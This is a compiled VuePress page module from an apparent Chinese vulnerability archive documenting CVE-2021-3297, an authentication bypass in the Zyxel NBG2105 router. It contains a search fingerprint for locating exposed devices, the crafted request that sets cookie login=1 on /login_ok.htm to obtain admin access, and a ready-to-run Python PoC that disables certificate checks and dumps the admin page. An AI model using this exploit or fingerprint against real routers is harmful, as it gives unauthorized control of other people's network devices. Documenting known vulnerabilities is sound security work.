import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as d,a as e,b as i,d as t,e as r}from"./app-58e4a7d6.js";const o={},u=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),c=e("p",null,"Zyxel NBG2105 存在身份验证绕过，攻击者通过更改 login参数可用实现后台登陆",-1),v=e("p",null,"参考阅读：",-1),m={href:"https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass",target:"_blank",rel:"noopener noreferrer"},p=r(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Zyxel NBG2105
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;ZyXEL-NBG2105&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140930455.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>其中前端文件 <strong>/js/util_gw.js</strong> 存在前端对 Cookie login参数的校验</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140930281.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到检测到 Cookie中的 <strong>login=1</strong> 则跳转 home.html</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>function setCookie() //login_ok.htm use
{
	document.cookie=&quot;login=1&quot;;
	MM_goToURL(&#39;parent&#39;, &#39;home.htm&#39;);
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>请求如下则会以管理员身份跳转到 <strong>home.htm页面</strong></p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/login_ok.htm

Cookie: login=1;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140931038.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># python3
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def poc(url):
    exp = url + &quot;/login_ok.htm&quot;

    header = {
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,
        &quot;cookie&quot;:&quot;login=1&quot;,
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=exp, headers=header, verify=False,timeout=10)
        #print(response.text)
        if response.status_code == 200 and &quot;GMT&quot; in response.text:
            print(exp + &quot; 存在Zyxel NBG2105 身份验证绕过 CVE-2021-3297漏洞！！！&quot;)
            print(&quot;数据信息如下：&quot;)
            print(response.text)
        else:
            print(exp + &quot; 不存在Zyxel NBG2105 身份验证绕过 CVE-2021-3297漏洞！！！&quot;)
    except Exception as e:
        print(exp + &quot;请求失败！！&quot;)


def main():
    url = str(input(&quot;请输入目标url：&quot;))
    poc(url)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,16);function b(g,h){const n=s("ExternalLinkIcon");return l(),d("div",null,[u,c,v,e("ul",null,[e("li",null,[e("a",m,[i("https://github.com/nieldk/vulnerabilities/blob/main/zyxel nbg2105/Admin bypass"),t(n)])])]),p])}const f=a(o,[["render",b],["__file","Zyxel NBG2105 身份验证绕过 CVE-2021-3297.html.vue"]]);export{f as default};
